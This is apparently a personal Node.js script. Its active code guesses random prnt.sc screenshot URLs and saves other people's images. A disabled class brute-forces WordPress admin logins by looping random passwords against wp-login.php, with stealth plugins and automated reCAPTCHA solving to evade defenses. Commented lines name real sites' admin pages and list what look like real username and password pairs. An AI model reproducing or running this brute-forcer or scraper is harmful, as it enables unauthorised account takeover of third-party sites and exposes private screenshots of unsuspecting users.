// gconf-service libasound2 libatk1.0-0 libatk-bridge2.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget
const cheerio = require('cheerio'),
    tress = require('tress'),
    needle = require('needle'),
    fs = require('fs'),
    axios = require('axios'),
    request = require('request'),
    path = require('path');
const puppeteer = require('puppeteer-extra');
// add stealth plugin and use defaults (all evasion techniques)
const pluginStealth = require("puppeteer-extra-plugin-stealth");
// add recaptcha plugin and provide it your 2captcha token
// 2captcha is the builtin solution provider but others work as well.
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha'); ///dist/index
const recaptchaPlugin = RecaptchaPlugin({
    provider: {id: '2captcha', token: 'XXXXXXX'},
    visualFeedback: true
});
puppeteer.use(pluginStealth());
puppeteer.use(recaptchaPlugin);


require('events').EventEmitter.defaultMaxListeners = 0;
// console.log(require('events').EventEmitter.defaultMaxListeners)
// console.log(process)
class ScreenShot {
    constructor() {
        this.stop = false;
        this.totalRequest = {
            google: 0,
            sites: 0,
            cached: 0
        };
        this.threads = 5;
    }
    async init() {


        try {
            this.pasrseImg()
        } catch {
            this.init()
        }





        return;

        new Promise((resolve,reject) => {
            console.time("Brute Work");
            this.n = 0;
            this.brute = tress((data, callback) => {
                this.bruteInit(data, callback);
            }, this.threads);
            this.brute.drain = () => {
                console.timeEnd("Brute Work");
                resolve();
            };
            for ( let i = 0; i < this.threads; i++ ) {
                this.brute.push({});
            }

        });
    }
   async pasrseImg() {
        do {
            await Promise.all([this.getImg(this.generateLink(5)), this.getImg(this.generateLink(6))]);
        } while (this.stop === false);
    }
    async getImg (url) {
        return new Promise(async(resolve, reject) => {
            needle.get(url, {},(err, res) => {
                if (err) {
                    console.log(err,'err');
                    resolve();
                    return;
                }

                // console.log(res.body);
                console.log(url);
                let $ = cheerio.load(res.body),
                    img = $("#screenshot-image").attr('src');
                console.log(img);
               if (img === undefined) {
                   resolve();
                   return;
               }
                    let filename = img.split('/').pop();


                fs.stat('./Javascript/Nodejs/googleParse/parsedimg/'+filename,(error_stats, stats) => {
                    if (error_stats != null) {
                        console.log('error_stats', error_stats.path, error_stats.code);
                        if (error_stats.code == "ENAMETOOLONG") {
                            console.log("EXIT FROM ERROR");
                            resolve();
                            return;
                        }
                        // console.log('write file',filename);
                        let stream = request(img);
                        stream.pipe(fs.createWriteStream('./Javascript/Nodejs/googleParse/parsedimg/'+filename)
                            .on('finish', () => {
                                resolve();
                            })
                            .on('error', () => {
                                resolve();
                            })
                        );
                        return;
                    }
                    resolve();
                });
            });
        })
    }
    async bruteInit() {

        //     let url = "https://babyforyou.org/wp-admin/";
        // let url = "https://artemida.ua/wp-admin/";
        // let url = "https://holiday.ua/wp-admin/";
        // let url = "https://nobimu.no/wp-admin";
        puppeteer.launch({args: ["--no-sandbox", '--disable-setuid-sandbox'], headless: true}).then(async browser => {//this.browser =
            // const page = this.page = await browser.newPage();
            const page = await browser.newPage();
            // await page.setViewport({width: 1280, height: 800});
            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36');
            //await page.setJavaScriptEnabled(false);//выключить js ВАЖНО
            await page.goto(this.url);
            await page.solveRecaptchas();
            let status = "/wp-login.php";
            // let status = await this.checkPassword({login:"Garbis1",password:"nE3qMdsLPRAg"},page);

            // status = await this.checkPassword({login:"Garbis",password:"nE3qMdsLPRAg"},page);
            // status = await this.checkPassword({login:"WebDevTravel",password:"BVUj7(!kIin!Kcqs^UHHtf2r"},page);
            // status = await this.checkPassword({login:"museum-user",password:"H01eOiLTQjxagz5by5"},page);

            do {
                status = await this.checkPassword({login:this.login, password:this.generatePassword( Math.floor((Math.random() * (25 - 6)) + 6)) }, page);

                this.n++;
                if (Number.isInteger(this.n/100)) {
                    console.log("WHILE = ", this.n);
                }
            } while (status == "/wp-login.php" && this.stop === false);
            this.brute.pause();
            this.stop = true;
            console.log("FIND PASSWORD", this.login, status);
        });

    }
    async checkPassword(data,page) {
        return new Promise(async (resolve, reject) => {
            // const page = this.page;
            // let urlEnd = true;
            try {
                await page.waitForSelector('input#user_login', { visible: true });
                let element =  await page.$('input#user_login');
                await page.evaluate( (el,data) => el.value = data.login, element, data);
                // await page.focus('input#user_login');
                // await page.type('input#user_login', data.login, {delay: 0});
                await page.waitForSelector('input#user_pass', { visible: true });
                element = await page.$('input#user_pass');
                await page.evaluate( (el,data) => el.value = data.password, element, data);
                // await page.type('input#user_pass', data.password, {delay: 0});
                // await page.click('input#wp-submit');
                // await page.waitForNavigation({waitUntil: 'networkidle0'});
                await Promise.all([
                    page.click('input#wp-submit'),
                    page.waitForResponse(response => response.url().indexOf("wp-login.php") > -1,{timeout: 15000})
                ]);
                let urlEnd = await page.evaluate(async () => location.pathname);
                console.log(urlEnd, "  ", data.password, " = ",data.password.length );
                resolve(urlEnd);
            } catch (err) {
                console.log(err,"errPass");
                resolve("/wp-login.php");
            }

        });
    }
    generateLink(length) {
        let chars = 'abcdefghijklmnopqrstuvwxyz0123456789',
            password = "";
        function randomInt(max) {
            return Math.floor(Math.random() * Math.floor(max));
        }
        for ( let i = 0; i < length; i++ ) {
            password += chars.substr(randomInt(chars.length),1);
        }
        return "https://prnt.sc/"+password;
    }
    generateFilePassword () {
        let stream = new fs.ReadStream(path.join(__dirname, '/BruteLibs/oCustom-WPATop/oCustom-WPA.txt'), {encoding: "utf-8"});
        // let stream = new fs.ReadStream(path.join(__dirname, '/BruteLibs/PsycOPacK/Pre-Expantion Wordlists/MalenamesCaps.txt'), {encoding: "utf-8"});
        let n = 0;
        stream.on('readable', async function() {
            await new Promise(async (resolve, reject) => {setTimeout(()=>{resolve()},1000)});
            n++;
            let data = stream.read().split(/\n|\r\n/);
            console.log(data[data.length - 1], n, data.length);
        });
        stream.on('end', function(){
            console.log("THE END");
        });
    }
}


(async function () {
    try {
        let screenShot = new ScreenShot();
        screenShot.init().then(n => {console.log(n)});
        // await domains.parse("www.fragrantica.ru").then(n => {console.log(n)});
        // await domains.parse("vash-aromat.ru").then(n => {console.log(n)});
        // await domains.parse("car.ua").then(n => {console.log(n)});
        // await ads.parseKeyword("Новости Украина");
    } catch (e) {
        console.log(e);
    }

})();

// export default Parser;
module.exports = {
    ScreenShot
};
